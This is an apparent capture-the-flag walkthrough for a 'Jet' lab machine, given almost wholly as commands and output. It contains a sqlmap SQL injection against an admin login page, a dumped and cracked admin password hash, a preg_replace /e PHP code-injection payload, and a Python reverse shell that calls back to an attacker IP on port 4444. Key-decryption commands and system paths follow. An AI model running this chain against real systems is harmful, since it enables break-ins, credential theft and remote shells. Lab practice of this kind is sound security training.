```
dig @10.13.37.10 -x 10.13.37.10
securewebinc.jet
```

```
sqlmap -u "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" --data="username=admin&password=foo" -p username --batch  
--dbms=mysql
```

```
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+
```

```
https://crackstation.net/
Hackthesystem200
```

```
swearwords[/mal/e]=phpinfo();&to=asd@asd&subject=asd&message=<p>mal</p>&_wysihtml5_mode=1

export RHOST="10.13.14.22";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```
openssl rsa -in certificate.pem -out publickey.pem -outform PEM -pubout
openssl rsautl -decrypt -inkey privatekey.pem -in key.bin.enc -out key.bin

/usr/bin/gettext.sh
/var/log/nginx/access.log
/tmp/tmux-33
/etc/cron.daily/passwd
```
## Reference

- https://blog.csdn.net/m0_46391769/article/details/109406362
- https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4
- https://anonfiles.com/j5o622lay2/Jet_zip